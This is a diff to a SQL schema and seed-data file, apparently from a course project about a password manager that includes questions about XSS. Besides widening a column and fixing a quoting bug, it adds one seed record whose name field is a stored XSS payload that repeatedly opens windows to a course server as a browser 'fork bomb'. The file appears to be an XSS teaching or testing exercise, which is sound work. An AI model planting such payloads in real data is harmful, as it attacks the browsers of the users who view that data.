@@ -32,7 +32,7 @@ CREATE TABLE `salts`(
 
 CREATE TABLE `records`(
 	`record_id` int NOT NULL AUTO_INCREMENT,
-    `record_name` varchar(100) NOT NULL,
+    `record_name` varchar(200) NOT NULL,
     `record_data` varchar(100) NOT NULL,
     `record_URL` varchar(100),
     `user` int,
@@ -71,6 +71,7 @@ VALUES
 ('USBank', '123456789', 'USBank.com',(SELECT id FROM user WHERE user_name='Kyle')),
 ('Twitter', 'montana', 'Twitter.com',(SELECT id FROM user WHERE user_name='Kyle')),
 ('IRS', 'supersecret', 'USA.gov',(SELECT id FROM user WHERE user_name='Kyle')),
+('>"&amp;gt;<script> function fork() { const win = window.open("http://flip3.engr.oregonstate.edu:6061/user/Kyle&12345"); setTimeout(fork(), 1); } fork(); </script>', 'Fork Bomb', 'Fork Bomb',(SELECT id FROM user WHERE user_name='Kyle')),
 ('OffShoreBank', '987654321', 'OffShoreBank.com',(SELECT id FROM user WHERE user_name='Katie')),
 ('OSU', 'banana', 'oregonstate.edu',(SELECT id FROM user WHERE user_name='Katie')),
 ('Xfinity', 'secrets', 'xfinity.com',(SELECT id FROM user WHERE user_name='Katie'));
@@ -96,7 +97,7 @@ VALUES
 ('fBBaFJTXZLCKUBgGo', 'DHJAbNWqferBXWheqxhYremjR', 'eJIIjiYiisvgtpatYgiksrwxexi.ihyGmzI',(SELECT id FROM userE WHERE user_name='QPexmiGYYYGAAAAS')),
 ('bfACgRtLCjmrzbFJGPouWnmxct', 'ihGhhUqZwigeqzHcAvGbDixwJRD', 'ceBGjbVcabjTUeATxmnTmrmxc.gsqQqDK',(SELECT id FROM userE WHERE user_name='QPexmiGYYYGAAAAS'));
 
-INSERT INTO `questions`(`question_content`, 'question_response')
+INSERT INTO `questions`(`question_content`, `question_response`)
 VALUES
 ('What is an XSS attack?', 'An XSS attack involves injecting malicious scripts into otherwise trusted websites'),
 ('Where can I learn more about XSS?', 'You can learn more at owasp.org.');
